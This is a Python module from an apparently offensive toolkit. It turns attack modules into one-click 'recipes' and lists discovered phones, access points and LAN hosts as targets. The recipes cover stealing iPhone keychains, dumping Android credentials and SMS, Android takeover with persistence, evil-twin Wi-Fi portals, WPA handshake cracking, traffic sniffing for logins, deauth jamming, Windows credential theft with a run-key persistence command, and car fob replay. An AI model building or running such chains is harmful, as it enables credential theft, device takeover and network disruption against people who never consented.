"""Task recipes: say what you want, not which module you want.

The module list is 230 entries deep, which is a wall. This is the layer above
it — a short list of *goals* ("steal an iPhone's saved passwords", "stand up a
fake Wi-Fi people join", "own this Windows box") where each goal knows:

* how to **discover its targets** (attached iPhones, USB Android devices, APs in
  range, hosts on the LAN), so you pick from a list instead of typing MACs;
* the **chain of modules** that does the job, in order, with the options filled
  in — no 50-item menu, no `OPT=value` syntax.

Nothing here invents capability: every step is an existing module, and running a
task is exactly running those modules. ``TASKS`` is the menu; :func:`discover`
builds the target list.
"""

from __future__ import annotations

from dataclasses import dataclass

from omni.core import proc

__all__ = ["Task", "Target", "TASKS", "TRADES", "get", "names", "by_trade",
           "discover"]


@dataclass(frozen=True)
class Target:
    """One selectable thing, and the value a step receives."""

    label: str
    value: str


@dataclass(frozen=True)
class Task:
    """A goal: a discovery source plus the module chain that achieves it."""

    key: str
    label: str
    blurb: str
    steps: tuple[tuple[str, tuple[tuple[str, str], ...]], ...]
    discover: str = ""                  # iphone | android | wifi | hosts
    target_opt: str = ""                # option the picked target fills
    needs: tuple[str, ...] = ()
    manual: str = ""                    # prompt when nothing is discovered


def _steps(*pairs: tuple[str, dict]) -> tuple:
    return tuple((name, tuple(sorted(opts.items()))) for name, opts in pairs)


TASKS: tuple[Task, ...] = (
    Task("iphone-creds", "Steal an iPhone's saved passwords",
         "back the phone up, then lift the keychain and the loot out of it",
         _steps(("ios.backup", {}),
                ("ios.loot", {"CATEGORY": "keychain", "EXTRACT": "true"}),
                ("ios.keychain", {"ACTION": "items"})),
         discover="iphone", target_opt="UDID", needs=("pymobiledevice3",),
         manual="iPhone UDID (see `idevice_id -l`)"),
    Task("iphone-control", "Drive an iPhone (tap, type, screenshot)",
         "check the phone is controllable, then open the remote console",
         _steps(("ios.up", {}), ("ios.remote", {})),
         discover="iphone", target_opt="UDID",
         needs=("pymobiledevice3",), manual="iPhone UDID"),
    Task("android-creds", "Empty an Android's saved data",
         "device info, Wi-Fi/account/message stores, then the SMS dump",
         _steps(("android.info", {}), ("android.creds", {}),
                ("android.dump", {"WHAT": "sms"})),
         discover="android", target_opt="SERIAL", needs=("adb",),
         manual="adb serial (see `adb devices`)"),
    Task("android-takeover", "Take an Android over (unlock, watch, persist)",
         "unlock it, log the clipboard and keep a payload alive",
         _steps(("android.unlock", {}),
                ("android.hijack", {"SECONDS": "600"}),
                ("android.persist", {"PACKAGE": "com.android.settings"})),
         discover="android", target_opt="SERIAL", needs=("adb",),
         manual="adb serial"),
    Task("fake-wifi", "Fake Wi-Fi people join by themselves (Pineapple)",
         "clone the strongest AP: twin + captive portal + NAT + live sniff",
         _steps(("wifi.pineapple", {"UPLINK": "auto"})),
         needs=("hostapd", "dnsmasq", "tcpdump")),
    Task("fake-wifi-names", "Fake Wi-Fi with names people know (open, multi)",
         "serve several remembered SSIDs wide open + portal, KARMA adds more",
         _steps(("wifi.eviltwin", {"KARMA": "true", "PORTAL": "true"})),
         needs=("hostapd", "dnsmasq")),
    Task("wifi-creds", "Capture this Wi-Fi's handshake and crack it",
         "deauth until a 4-way lands, then try a wordlist",
         _steps(("wifi.handshake", {}), ("wifi.crack", {})),
         discover="wifi", target_opt="BSSID",
         needs=("airodump-ng", "aireplay-ng"), manual="BSSID (see `wifi.scan`)"),
    Task("wifi-watch", "Read HTTP/HTTPS on this network",
         "live sniffer: requests, logins, SNI, certificate names "
         "(pktmon stand-in on Windows)", _steps(("wifi.sniff", {}))),
    Task("pc-watch", "Read HTTP/HTTPS on this PC (no adapter needed)",
         "pktmon capture on Windows, then the same decoder over the pcap",
         _steps(("windows.sniff", {})), needs=("pktmon",)),
    Task("wifi-jam", "Kick everything off the Wi-Fi",
         "deauth flood across the whole band",
         _steps(("wifi.jam", {"MODE": "deauth", "CHANNELS": "1-13"})),
         needs=("mdk4",)),
    Task("windows-own", "Take this Windows box over",
         "saved Wi-Fi keys, browser logins, autostart persistence",
         _steps(("windows.wifi", {}), ("windows.logins", {}),
                ("windows.persist", {"ACTION": "add", "METHOD": "runkey",
                                     "COMMAND": "cmd.exe /c start cmd"})),
         needs=("powershell",)),
    Task("car-key", "Open a car with its own fob",
         "listen for the press, work out the protocol, predict and replay",
         _steps(("car.unlock", {}))),
    Task("recon", "What is on this box and around me",
         "adapters, phones, radios, tools — and the LAN doors that answer",
         _steps(("core.devices", {}), ("pentest.reach", {"RUN": "true"}))),
)

#: display grouping: trade -> task keys
TRADES = {"phone": ("iphone-creds", "iphone-control", "android-creds",
                    "android-takeover"),
          "wifi": ("fake-wifi", "fake-wifi-names", "wifi-creds", "wifi-watch",
                   "wifi-jam"),
          "host": ("windows-own", "pc-watch", "car-key", "recon")}


#: module -> (tool, Windows stand-in) used when the tool is absent here
FALLBACKS = {"wifi.sniff": ("tcpdump", "windows.sniff"),
             "wifi.pineapple": ("hostapd", "windows.twin"),
             "wifi.eviltwin": ("hostapd", "windows.twin")}


def substitute(module: str) -> str:
    """The module to actually run on this host (Windows stand-ins applied)."""
    from omni.core import platform as host

    entry = FALLBACKS.get(module)
    if not entry:
        return module
    _tool, stand_in = entry
    # a native Windows stand-in beats a WSL tool here: pktmon sees the Windows
    # NICs and the hosted network needs no attached adapter at all
    if host.is_windows():
        return stand_in
    return module


def step_needs(task: Task) -> list[str]:
    """Tools the *substituted* steps actually need on this host (and lack).

    A tool the replaced module needed is dropped when a stand-in takes over —
    that is what stops "missing hostapd" on a Windows box where the hosted
    network does the job.
    """
    from omni.core import proc
    from omni.core.module import registry

    needed: list[str] = list(task.needs)
    suppressed: list[str] = []
    for step, _opts in task.steps:
        actual = substitute(step)
        original = registry.get(step)
        if original is not None and actual != step:
            suppressed.extend(getattr(original, "NEEDS", ()) or ())
        cls = registry.get(actual)
        if cls is not None:
            needed.extend(getattr(cls, "NEEDS", ()) or ())
    unique: list[str] = []
    for tool in needed:
        if tool not in unique:
            unique.append(tool)
    return [tool for tool in unique
            if tool not in suppressed and not proc.has(tool)]





def get(key: str) -> Task:
    for task in TASKS:
        if task.key == key:
            return task
    raise ValueError(f"unknown task {key!r} — one of {', '.join(names())}")


def names() -> list[str]:
    return [task.key for task in TASKS]


def by_trade() -> dict[str, list[Task]]:
    return {trade: [get(key) for key in keys] for trade, keys in TRADES.items()}



# ---------------------------------------------------------------------------
# discovery
# ---------------------------------------------------------------------------

def _run(argv: list[str], timeout: int = 20) -> list[str]:
    return proc.run(argv, timeout=timeout).lines()


def _iphones() -> list[Target]:
    rows: list[Target] = []
    for udid in _run(["idevice_id", "-l"], 15):
        label = udid
        info = proc.run(["ideviceinfo", "-u", udid, "-k", "DeviceName"],
                        timeout=15).out.strip()
        if info:
            label = f"{info}  ({udid[:8]}...)"
        rows.append(Target(f"iPhone  {label}", udid))
    return rows


def _androids() -> list[Target]:
    rows: list[Target] = []
    for line in _run(["adb", "devices", "-l"], 15)[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            model = next((part.split(":", 1)[1] for part in parts
                          if part.startswith("model:")), "android")
            rows.append(Target(f"Android  {model}  ({parts[0]})", parts[0]))
    return rows


def _aps() -> list[Target]:
    from omni.wifi import iface as iface_mod, scan

    try:
        try:
            iface = iface_mod.pick(None)
        except RuntimeError:
            iface = ""
        found = scan.scan_any(iface)
    except Exception:                            # noqa: BLE001 - no radio
        return []
    rows = [Target(f"{ap.get('ssid') or '(hidden)'}  {ap.get('bssid')}  "
                   f"ch{ap.get('channel')}  {ap.get('security')}",
                   str(ap.get("bssid")))
            for ap in found if ap.get("bssid")]
    return sorted(rows, key=lambda target: target.label)


def _hosts() -> list[Target]:
    from omni.core import platform as host_os
    from omni.pentest import reach

    rows = [Target(f"{row['name']}  {row['service']}", row["host"])
            for row in reach.parse_mdns(
                proc.run(["avahi-browse", "-at", "-r", "-p"], timeout=15).out)
            if row.get("host")]
    neigh = proc.run(["ip", "neigh"], timeout=10).out
    if not neigh and host_os.is_windows():
        neigh = proc.run(["arp", "-a"], timeout=10).out
    for host in reach.parse_arp(neigh):
        rows.append(Target(host, host))
    return rows


DISCOVERERS = {"iphone": _iphones, "android": _androids, "wifi": _aps,
               "hosts": _hosts}


def discover(kind: str) -> list[Target]:
    """Targets for a task's ``discover`` source (empty when nothing answers)."""
    finder = DISCOVERERS.get(kind)
    return finder() if finder else []
